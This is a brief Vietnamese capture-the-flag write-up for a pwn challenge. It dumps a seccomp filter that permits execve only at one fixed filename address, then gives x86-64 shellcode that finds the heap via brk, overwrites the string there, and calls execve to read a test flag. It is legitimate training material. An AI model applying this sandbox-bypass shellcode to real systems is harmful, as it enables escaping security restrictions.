# playtime write up 
- với bài này thì em có thể chạy execve tối thượng nhưng không cho phép chạy trên 1 địa chỉ khác, mà chỉ cho chạy trên địa chỉ cố định 
```bash
🍎 >> seccomp-tools dump ./playground
The playground is yours. How do you like to play?
fsdkahfd
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x23 0xc000003e  if (A != ARCH_X86_64) goto 0037
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x20 0xffffffff  if (A != 0xffffffff) goto 0037
 0005: 0x15 0x1f 0x00 0x00000000  if (A == read) goto 0037
 0006: 0x15 0x1e 0x00 0x00000002  if (A == open) goto 0037
 0007: 0x15 0x1d 0x00 0x00000003  if (A == close) goto 0037
 0008: 0x15 0x1c 0x00 0x00000009  if (A == mmap) goto 0037
 0009: 0x15 0x1b 0x00 0x0000000a  if (A == mprotect) goto 0037
 0010: 0x15 0x1a 0x00 0x0000000b  if (A == munmap) goto 0037
 0011: 0x15 0x19 0x00 0x00000011  if (A == pread64) goto 0037
 0012: 0x15 0x18 0x00 0x00000012  if (A == pwrite64) goto 0037
 0013: 0x15 0x17 0x00 0x00000013  if (A == readv) goto 0037
 0014: 0x15 0x16 0x00 0x00000014  if (A == writev) goto 0037
 0015: 0x15 0x15 0x00 0x00000019  if (A == mremap) goto 0037
 0016: 0x15 0x14 0x00 0x0000001d  if (A == shmget) goto 0037
 0017: 0x15 0x13 0x00 0x0000001e  if (A == shmat) goto 0037
 0018: 0x15 0x12 0x00 0x00000038  if (A == clone) goto 0037
 0019: 0x15 0x11 0x00 0x00000039  if (A == fork) goto 0037
 0020: 0x15 0x10 0x00 0x0000003a  if (A == vfork) goto 0037
 0021: 0x15 0x0f 0x00 0x0000003e  if (A == kill) goto 0037
 0022: 0x15 0x0e 0x00 0x00000055  if (A == creat) goto 0037
 0023: 0x15 0x0d 0x00 0x00000065  if (A == ptrace) goto 0037
 0024: 0x15 0x0c 0x00 0x00000101  if (A == openat) goto 0037
 0025: 0x15 0x0b 0x00 0x00000127  if (A == preadv) goto 0037
 0026: 0x15 0x0a 0x00 0x00000136  if (A == process_vm_readv) goto 0037
 0027: 0x15 0x09 0x00 0x00000137  if (A == process_vm_writev) goto 0037
 0028: 0x15 0x08 0x00 0x00000142  if (A == execveat) goto 0037
 0029: 0x15 0x07 0x00 0x00000147  if (A == preadv2) goto 0037
 0030: 0x15 0x06 0x00 0x00000148  if (A == pwritev2) goto 0037
 0031: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0036
 0032: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)
 0033: 0x15 0x00 0x03 0x00005555  if (A != 0x5555) goto 0037
 0034: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)
 0035: 0x15 0x00 0x01 0x555592a0  if (A != 0x555592a0) goto 0037
 0036: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0037: 0x06 0x00 0x00 0x00000000  return KILL
```
- rất rõ ràng là ở đây
```bash
if (A != 0x555592a0) goto 0037

```
- chính vì vậy em có thể thay đổi nội dung ở đó để nó có thể chạy những gì mà em muốn 
- sử dụng các thao tác với assembly
```assembly
                mov rax,0xc
                syscall 
                mov rdi,rax
                sub rdi,134496
                mov rsi,0
                mov rdx,0
                mov r10,7020098569267261230
                mov [rdi],r10
                add rdi,8
                mov r10,103
                mov [rdi],r10
                sub rdi,8
                mov rax,0x3b
                syscall
```

- sau filter seccomp thì không còn địa chỉ gì trên thanh ghi nên em có thể call brk để lấy được địa chỉ vùng heap  
- tính toán 1 số cái là có thể lấy được flag
```bash
    00000010  61 67 7d 00                                         │ag}·│
    00000014
squ1rrel{test_flag}\x00[*] Process '/home/as/pwnable/report/playtime/playgrounde' stopped with exit code 0 (pid 12445)
[*] Got EOF while reading in interactive
```
